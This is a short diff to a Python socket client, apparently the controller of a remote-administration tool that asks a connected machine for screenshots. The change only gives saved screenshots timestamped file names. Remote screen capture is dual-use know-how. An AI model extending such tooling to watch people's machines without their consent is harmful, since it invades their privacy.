@@ -2,6 +2,7 @@ import socket
 import os
 import time
 import re
+import datetime
 
 # Commands
 CMD_END_CONNECTION = 'end_connection'
@@ -128,8 +129,10 @@ class Client:
         try:
             if self.is_connected:
                 self.socket.send(CMD_TAKE_SCREENSHOT.encode())
-                self.save_file(TMP_PATH, 'screenshot.png', 'wb')
-                os.startfile(os.path.join(TMP_PATH, 'screenshot.png'))
+                file_name = datetime.datetime.now().strftime("%Y-%m-%d_%Hh%Mm%Ss") + ".png"
+                print(file_name)
+                self.save_file(TMP_PATH, file_name, 'wb')
+                os.startfile(os.path.join(TMP_PATH, file_name))
                 print("[SUCCESS] Screenshot saved")
                 return "[SUCCESS] Screenshot saved"
             else:
